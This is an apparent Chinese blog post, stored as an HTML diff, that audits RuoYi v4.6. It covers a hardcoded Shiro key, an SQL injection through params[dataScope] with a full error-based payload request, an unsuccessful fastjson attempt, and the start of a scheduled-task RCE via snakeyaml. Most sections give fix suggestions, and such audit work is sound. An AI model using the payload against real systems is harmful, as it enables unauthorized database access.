@@ -1,0 +1,1158 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    若依v4.6 |
+    
+    S@Ku_yA的blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="若依v4.6项目源码 查看pom.xml依赖组件首先看一下pom.xml依赖组件  fastjson 1.2.74版本有点高 还不是很会jackson 2.10.5  多个链子可以打  mysql 8.0.22 应该打不了  Shiro版本为1.7.0  thymeleaf version 3.0.11 做视图解析 snakeyaml version 1.25 解析yaml文件  登录部分定位到">
+<meta property="og:type" content="article">
+<meta property="og:title" content="若依v4.6">
+<meta property="og:url" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/index.html">
+<meta property="og:site_name" content="S@Ku_yA的blog">
+<meta property="og:description" content="若依v4.6项目源码 查看pom.xml依赖组件首先看一下pom.xml依赖组件  fastjson 1.2.74版本有点高 还不是很会jackson 2.10.5  多个链子可以打  mysql 8.0.22 应该打不了  Shiro版本为1.7.0  thymeleaf version 3.0.11 做视图解析 snakeyaml version 1.25 解析yaml文件  登录部分定位到">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152605154.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152737511.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152804542.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152852767.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502165944238.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260509145042438.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260509145145144.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260509151007627.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260509194433106.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152952422.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502153050234.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502153123087.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160121115.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160155295.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160336880.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160437214.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160518895.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160620304.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502162102789.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151115073.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151155182.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151254714.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151340104.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151437431.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151520141.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151556364.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151634091.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151650391.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151739532.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503152138726.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151859093.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503152033603.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503171529177.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260504152138821.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260504152217672.png">
+<meta property="og:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260506095139192.png">
+<meta property="article:published_time" content="2026-05-01T08:42:26.000Z">
+<meta property="article:modified_time" content="2026-05-15T12:40:15.556Z">
+<meta property="article:author" content="S@Ku_yA">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152605154.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="S@Ku_yA的blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css" integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr&#x2F;Io" crossorigin="anonymous">
+
+    
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+    
+  </nav>
+  
+</div>
+<header id="header" aria-label="Site header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="若依v4.6">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">若依v4.6</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8B%A5%E4%BE%9Dv4-6"><span class="toc-number">1.</span> <span class="toc-text">若依v4.6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bpom-xml%E4%BE%9D%E8%B5%96%E7%BB%84%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">查看pom.xml依赖组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E9%83%A8%E5%88%86"><span class="toc-number">1.2.</span> <span class="toc-text">登录部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E5%9B%BA%E5%AE%9Akey"><span class="toc-number">1.3.</span> <span class="toc-text">shiro固定key</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-%E6%9A%82%E6%97%B6%E6%89%93%E4%B8%8D%E5%87%BA%E6%9D%A5"><span class="toc-number">1.5.</span> <span class="toc-text">fastjson (暂时打不出来)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1rce"><span class="toc-number">1.6.</span> <span class="toc-text">定时任务rce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.6.1.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-3"><span class="toc-number">1.6.2.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">Thymeleaf模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">小结</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">43</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-若依v4-6" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-01T08:42:26.000Z" itemprop="datePublished">2026-05-01</time>
+    <time style="display: none;" id="post-update-time">2026-05-15</time>
+  </span>
+  
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">代码审计</a>
+  </div>
+
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="若依v4-6"><a href="#若依v4-6" class="headerlink" title="若依v4.6"></a>若依v4.6</h2><p><a target="_blank" rel="noopener" href="https://github.com/yangzongzhuan/RuoYi/archive/refs/tags/v4.6.0.zip">项目源码</a></p>
+<h3 id="查看pom-xml依赖组件"><a href="#查看pom-xml依赖组件" class="headerlink" title="查看pom.xml依赖组件"></a>查看pom.xml依赖组件</h3><p>首先看一下pom.xml依赖组件</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152605154.png" alt="image-20260502152605154"></p>
+<p>fastjson 1.2.74版本有点高</p>
+<p>还不是很会jackson 2.10.5</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152737511.png" alt="image-20260502152737511"></p>
+<p>多个链子可以打</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152804542.png" alt="image-20260502152804542"></p>
+<p>mysql 8.0.22 应该打不了</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152852767.png" alt="image-20260502152852767"></p>
+<p>Shiro版本为1.7.0</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502165944238.png"></p>
+<p>thymeleaf version 3.0.11 做视图解析</p>
+<p>snakeyaml version 1.25 解析yaml文件 </p>
+<h3 id="登录部分"><a href="#登录部分" class="headerlink" title="登录部分"></a>登录部分</h3><p>定位到 <code>/login</code></p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260509145042438.png" alt="image-20260509145042438"></p>
+<p>来到SysLoginController这里</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260509145145144.png" alt="image-20260509145145144"></p>
+<p>获取前端输入的账号密码包装成token 获取subject对象 shiro里面指代的用户对象</p>
+<p>携带token进入shiro的login方法 </p>
+<p>整个流程就是shiro框架登录的流程 直接看看realms配置</p>
+<hr>
+<p>看看shiro配置类</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260509151007627.png" alt="image-20260509151007627"></p>
+<p>一些静态资源不鉴权 其他的所有路径 <code>/**</code> 都会鉴权</p>
+<p>查看UserRealms</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260509194433106.png" alt="image-20260509194433106"></p>
+<p>如果登录上的用户是admin用户 那就有所有权限</p>
+<p>如果不是的话就是普通用户 并且通过userid去唯一确定某个普通用户</p>
+<p>功能点也是通过userid去分配</p>
+<h3 id="shiro固定key"><a href="#shiro固定key" class="headerlink" title="shiro固定key"></a>shiro固定key</h3><p>看看有无shiro固定密钥</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502152952422.png" alt="image-20260502152952422"></p>
+<p>在ruyi-admin&#x2F;src&#x2F;main&#x2F;resource&#x2F;application.yml中存在固定shirokey</p>
+<p>使用工具尝试反序列化</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502153050234.png" alt="image-20260502153050234"></p>
+<p>使用aes gcm模式尝试检测密钥 显示成功</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502153123087.png" alt="image-20260502153123087"></p>
+<p>反序列化执行成功 </p>
+<p>存在固定密钥</p>
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>不要使用固定key</p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>若依使用的是mybatis框架 我们直接全局搜索</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160121115.png" alt="image-20260502160121115"></p>
+<p>存在使用未预编译的参数</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160155295.png" alt="image-20260502160155295"></p>
+<p><strong>注意这里的参数在实际访问的形式应该是数组形式</strong></p>
+<p><code>params[dataScope]</code></p>
+<p>寻找Controller</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160336880.png" alt="image-20260502160336880"></p>
+<p>根据名字直接去网页上面找</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/system/user/list</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160437214.png" alt="image-20260502160437214"></p>
+<p>点击用户管理 并抓包</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160518895.png" alt="image-20260502160518895"></p>
+<p>可以找到对应的路由与参数信息</p>
+<p>默认是没有params[dataScope]</p>
+<p>我们直接加上</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502160620304.png" alt="image-20260502160620304"></p>
+<p>一个单引号直接报错了 存在报错注入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageSize=10&amp;pageNum=1&amp;orderByColumn=createTime&amp;isAsc=desc&amp;deptId=&amp;parentId=&amp;loginName=&amp;phonenumber=&amp;status=&amp;params%5BbeginTime%5D=&amp;params%5BendTime%5D=&amp;params[dataScope]=and(extractvalue(1,concat(0x23,version(),0x00)))%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260502162102789.png" alt="image-20260502162102789"></p>
+<p>成功执行报错注入</p>
+<h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><p>在一定要使用<code>${</code>的地方一定要做好限制 加白加黑</p>
+<h3 id="fastjson-暂时打不出来"><a href="#fastjson-暂时打不出来" class="headerlink" title="fastjson (暂时打不出来)"></a>fastjson (暂时打不出来)</h3><p>依赖包中存在fastjson 1.2.74版本有点高不好打</p>
+<p>全局搜索</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseObject(</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151115073.png" alt="image-20260503151115073"></p>
+<p>有几个结果</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151155182.png" alt="image-20260503151155182"></p>
+<p>第一个方法里面 被调用都是在匿名类中被调用 应该没法利用</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151254714.png" alt="image-20260503151254714"></p>
+<p>这个方法有在一个Controller被调用了 应该可以利用</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151340104.png" alt="image-20260503151340104"></p>
+<p><code>/tool/gen/edit</code>路由接收一个genTable参数</p>
+<p>我们去网页上面找找</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151437431.png" alt="image-20260503151437431"></p>
+<p>点击保存并抓包</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151520141.png" alt="image-20260503151520141"></p>
+<p>有一堆参数 调试一下</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151556364.png" alt="image-20260503151556364"></p>
+<p>第一个判断就寄了 是参数里面有个值不对</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151634091.png" alt="image-20260503151634091"></p>
+<p>某个值要是tree </p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151650391.png" alt="image-20260503151650391"></p>
+<p>继续调试</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151739532.png" alt="image-20260503151739532"></p>
+<p>只获取了参数里面Params里面的值 尝试修改key打payload</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503152138726.png" alt="image-20260503152138726"></p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503151859093.png" alt="image-20260503151859093"></p>
+<p>多次尝试 options里面的参数顺序总是val在前 @type在后 </p>
+<p>发现这里的逻辑是先获取参数并先放到一个hashmap里面 然后再取里面的参数转为String之后拿去解析</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503152033603.png" alt="image-20260503152033603"></p>
+<p><strong>hashmap是无序的 具体参数的顺序是根据key的hashcode</strong> 导致val总是在@type前面 至少是dnslog打不了</p>
+<p>目前只能说 这里可能存在fastjson漏洞</p>
+<p>这里利用也有点苛刻 一般都是可以直接接收json格式的数据 这里只能构造键值对去打</p>
+<p>不知道有没有大佬这里利用出来了（）</p>
+<h4 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h4><p>可以直接使用fastjson2 或者 开启safemode 又或者每次解析的时候都相对应的类</p>
+<h3 id="定时任务rce"><a href="#定时任务rce" class="headerlink" title="定时任务rce"></a>定时任务rce</h3><p>若依后台有一个定时任务</p>
+<p>定时任务大概率可能是通过反射调用 或者直接有什么接口可以输出代码执行</p>
+<p>寻找有关定时任务的内容</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260503171529177.png" alt="image-20260503171529177"></p>
+<p>不是有个装门搞定时任务的项目文件夹吗 </p>
+<p>在这里面找到util工具包 里面有个定时任务执行的java文件</p>
+<p>里面有invokeMethod方法 这里就是最后定时任务执行的地方</p>
+<p>确实是反射调用</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260504152138821.png" alt="image-20260504152138821"></p>
+<p>分别获取任务 bean名 方法名 参数值列表</p>
+<p><img src="/2026/05/01/%E8%8B%A5%E4%BE%9Dv4-6/image-20260504152217672.png" alt="image-20260504152217672"></p>
+<p>通过加载bean的class 并通过无参构造器去获得实例 最后执行方法</p>
+<hr>
+<p>这里其实就有点类似ctf题了 </p>
+<p>什么类有无参构造器 并且内部有什么方法可以直接通过参数去命令执行</p>
+<p>最后的调用形式可以简单写成</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象.方法(参数...)</span><br></pre></td></tr></table></figure>
+
+<p>这里刚好是有snakeyaml的jar包 所以可以直接用Yaml.load()打反序列化</p>
